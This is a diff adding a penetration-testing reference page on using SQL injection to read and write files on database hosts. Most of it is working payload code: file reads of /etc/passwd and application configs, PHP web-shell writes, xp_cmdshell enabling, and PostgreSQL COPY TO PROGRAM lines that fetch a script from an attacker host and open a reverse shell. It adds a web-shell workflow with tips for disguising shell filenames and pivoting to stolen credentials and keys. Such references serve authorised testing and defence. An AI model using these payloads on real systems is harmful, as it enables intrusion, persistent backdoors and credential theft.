@@ -1,0 +1,257 @@
+---
+title: SQLi File Operations
+description: Reading and writing files on the database host via SQL injection.
+mitre: [T1190, T1005, T1059]
+d3fend: [D3-MH, D3-EI, D3-FA]
+impact: [FileRead, FileWrite, RCE]
+owasp: [A05]
+sidebar:
+  order: 11
+  label: File operations
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+When the database account has appropriate privileges, SQL injection can read arbitrary files from the database server's filesystem and, in some cases, write files - including web shells.
+
+<Aside type="danger">
+File write and command execution are loud, attributable, and often illegal outside authorised testing. Confirm authorisation and impact before reaching for these techniques.
+</Aside>
+
+## TL;DR
+
+<Tabs syncKey="dbms">
+  <TabItem label="MySQL">
+    ```sql
+    -- Read file
+    ' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL-- -
+
+    -- Write web shell (legacy, often blocked)
+    ' UNION SELECT '<?php system($_GET["c"]); ?>', NULL, NULL INTO OUTFILE '/var/www/html/shell.php'-- -
+    ```
+  </TabItem>
+  <TabItem label="PostgreSQL">
+    ```sql
+    -- Read file (superuser)
+    ' UNION SELECT NULL, pg_read_file('/etc/passwd', 0, 100000), NULL-- -
+
+    -- Command execution via COPY
+    '; COPY (SELECT '') TO PROGRAM 'id > /tmp/out'-- -
+    ```
+  </TabItem>
+  <TabItem label="MSSQL">
+    ```sql
+    -- Command execution via xp_cmdshell
+    '; EXEC master..xp_cmdshell 'whoami'-- -
+    ```
+  </TabItem>
+</Tabs>
+
+## Privilege requirements
+
+| DBMS | Read files | Write files | RCE |
+|---|---|---|---|
+| MySQL | `FILE` privilege + `secure_file_priv` permits target dir | `FILE` privilege + `secure_file_priv` permits target dir + path is web-served | Generally not possible directly; via UDF if `plugin_dir` writable |
+| PostgreSQL | Superuser (or `pg_read_server_files` role in 11+) | Superuser | Superuser via `COPY ... TO PROGRAM` |
+| MSSQL | `xp_dirtree` / `xp_fileexist` (sysadmin or specific perms) | `xp_cmdshell` (sysadmin) | `xp_cmdshell` (sysadmin) |
+| Oracle | `JAVA IO PERMISSION`, `UTL_FILE` (DBA) | `UTL_FILE` (DBA) | `DBMS_SCHEDULER` / Java (DBA) |
+
+<Aside type="tip">
+Always check current privileges first - most injection points run as a low-privilege application user. Don't waste time on file write payloads against an unprivileged DB account.
+</Aside>
+
+## MySQL file operations
+
+### Check `FILE` privilege
+
+```sql
+' UNION SELECT NULL, GROUP_CONCAT(privilege_type), NULL FROM information_schema.user_privileges-- -
+' UNION SELECT NULL, current_user(), NULL-- -
+```
+
+Look for `FILE` in the privilege list.
+
+### Check `secure_file_priv`
+
+```sql
+' UNION SELECT NULL, @@secure_file_priv, NULL-- -
+```
+
+Possible values:
+- `NULL` → file ops disabled entirely.
+- `''` (empty) → reads/writes allowed anywhere.
+- `/some/path/` → reads/writes restricted to that directory.
+
+### Read file
+
+```sql
+' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL-- -
+' UNION SELECT NULL, LOAD_FILE('/var/www/html/config.php'), NULL-- -
+' UNION SELECT NULL, LOAD_FILE('C:/Windows/System32/drivers/etc/hosts'), NULL-- -
+```
+
+`LOAD_FILE()` returns NULL if:
+- File doesn't exist
+- File is larger than `max_allowed_packet` (default 64MB but historically 1MB)
+- MySQL process can't read it (permissions)
+- `secure_file_priv` blocks the path
+
+### Write file
+
+```sql
+' UNION SELECT '<?php system($_GET[0]); ?>', NULL, NULL INTO OUTFILE '/var/www/html/x.php'-- -
+```
+
+Constraints:
+- The number of `SELECT`ed values must match the column count.
+- The target file must not exist (no overwrite).
+- `secure_file_priv` must permit the path.
+- MySQL process needs filesystem write access to that path.
+
+To write to a path with a known column count:
+
+```sql
+' UNION SELECT '<?php system($_GET[0]); ?>',2,3,4 INTO OUTFILE '/var/www/html/x.php'-- -
+```
+
+When the web root path is unknown, common locations:
+```
+/var/www/html/                  (Debian/Ubuntu Apache default)
+/var/www/                       (older default)
+/srv/http/                      (Arch / BlackArch / Athena OS)
+/usr/share/nginx/html/          (Nginx)
+/inetpub/wwwroot/               (IIS)
+```
+
+## PostgreSQL file operations
+
+### Read file
+
+Superuser only (or `pg_read_server_files` role in PG 11+):
+
+```sql
+' UNION SELECT NULL, pg_read_file('/etc/passwd', 0, 100000), NULL-- -
+```
+
+For binary files use `pg_read_binary_file()`.
+
+### Write file via `COPY`
+
+```sql
+'; COPY (SELECT '<?php system($_GET[0]); ?>') TO '/var/www/html/x.php'-- -
+```
+
+Requires stacked queries and superuser.
+
+### RCE via `COPY ... TO PROGRAM`
+
+PostgreSQL 9.3+ allows `COPY` to pipe data to/from a shell command:
+
+```sql
+'; COPY (SELECT '') TO PROGRAM 'id > /tmp/out'-- -
+'; COPY (SELECT '') TO PROGRAM 'curl http://<ATTACKER>/sh | bash'-- -
+'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<ATTACKER>/4444 0>&1"'-- -
+```
+
+<Aside type="tip">
+This is the most reliable PostgreSQL → RCE path when you have superuser. Always try `COPY ... TO PROGRAM` before more exotic techniques.
+</Aside>
+
+### RCE via extension creation
+
+If `COPY ... TO PROGRAM` is restricted but you have superuser, dynamic library loading is sometimes possible - depends heavily on PG configuration and beyond this page's scope.
+
+## MSSQL file operations
+
+### Enable and use `xp_cmdshell`
+
+```sql
+-- Enable advanced options
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE-- -
+
+-- Enable xp_cmdshell
+'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE-- -
+
+-- Run a command
+'; EXEC master..xp_cmdshell 'whoami'-- -
+
+-- Get output (when reflected)
+' UNION SELECT NULL, output, NULL FROM (SELECT * FROM OPENROWSET('SQLNCLI', 'server=.;trusted_connection=yes', 'set fmtonly off; exec master..xp_cmdshell ''whoami''')) AS t-- -
+```
+
+When output isn't reflected, redirect:
+
+```sql
+'; EXEC master..xp_cmdshell 'whoami > C:\inetpub\wwwroot\out.txt'-- -
+```
+
+Then `GET /out.txt`.
+
+### Read file
+
+```sql
+'; EXEC master..xp_cmdshell 'type C:\path\to\file.txt'-- -
+
+-- Or via BULK INSERT
+' UNION SELECT NULL, BulkColumn, NULL FROM OPENROWSET(BULK 'C:\path\to\file.txt', SINGLE_CLOB) AS t-- -
+```
+
+### Check directory contents
+
+```sql
+'; EXEC master..xp_dirtree 'C:\', 1, 1-- -
+```
+
+## Oracle file operations
+
+Oracle file operations require DBA privileges and are rarely available via injection. Brief reference:
+
+```sql
+-- Read file via UTL_FILE (DBA)
+SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('DIR_OBJECT', 'file.txt', 'R'), buffer) FROM dual;
+
+-- Java-based command execution (DBA, complex)
+-- Generally requires deploying a Java class - out of scope for casual exploitation
+```
+
+For Oracle, focus on data extraction and use other vectors (network services, weak credentials) for code execution.
+
+## Web shell drop workflow
+
+When you can write files and the path is web-served:
+
+<Steps>
+
+1. **Confirm web root** - read `index.php` or `index.html` via `LOAD_FILE` to confirm the path is correct.
+2. **Drop minimal shell** - keep it small to reduce filter risk:
+   ```php
+   <?php system($_GET[0]); ?>
+   ```
+3. **Verify via HTTP**:
+   ```
+   GET /x.php?0=id
+   ```
+4. **Upgrade to reverse shell** - once command exec works, fetch a real reverse shell:
+   ```
+   GET /x.php?0=curl%20http://<ATTACKER>/sh%20|%20bash
+   ```
+
+</Steps>
+
+<Aside type="tip">
+Filename tips: avoid obvious names (`shell.php`, `cmd.php`) - some apps scan the web root. Use innocuous names mimicking the application: `assets.php`, `helper.php`, `cache.php`.
+</Aside>
+
+## Common failure modes
+
+- **`LOAD_FILE` returns NULL** - privilege missing, path wrong, file too large, or `secure_file_priv` blocking. Check each in order.
+- **`INTO OUTFILE` errors with "Can't create"** - target directory not writable by MySQL process or `secure_file_priv` restriction.
+- **`xp_cmdshell` returns "SQL Server blocked access"** - disabled in configuration; enable via `sp_configure` (requires sysadmin).
+- **`COPY ... TO PROGRAM` returns "must be superuser"** - current PG user is not superuser. Try escalating via known PG CVEs or stop here.
+- **Web shell uploaded but not executable** - server doesn't parse the extension as PHP. Try `.phtml`, `.php5`, `.phar`, or move to a directory with PHP execution enabled.
+
+## Notes
+
+- File operations are the bridge from "I have SQLi" to "I have a shell on the database server." This is often the most impactful finding in a report.
+- Reading `/etc/passwd` proves file read but isn't actionable. Pivot to reading the application's config (DB credentials, API keys, session secrets, private keys) for further compromise.
+- On Windows, prefer reading `C:\Windows\System32\config\SAM` and `SECURITY` only if you have SYSTEM-level read access, which is unusual via DB injection. More realistic targets: web.config, application config, IIS logs.
+- Writing files is louder than reading - every web shell drop is a clear backdoor that triggers AV/EDR. In real engagements, weigh the noise vs. the goal.
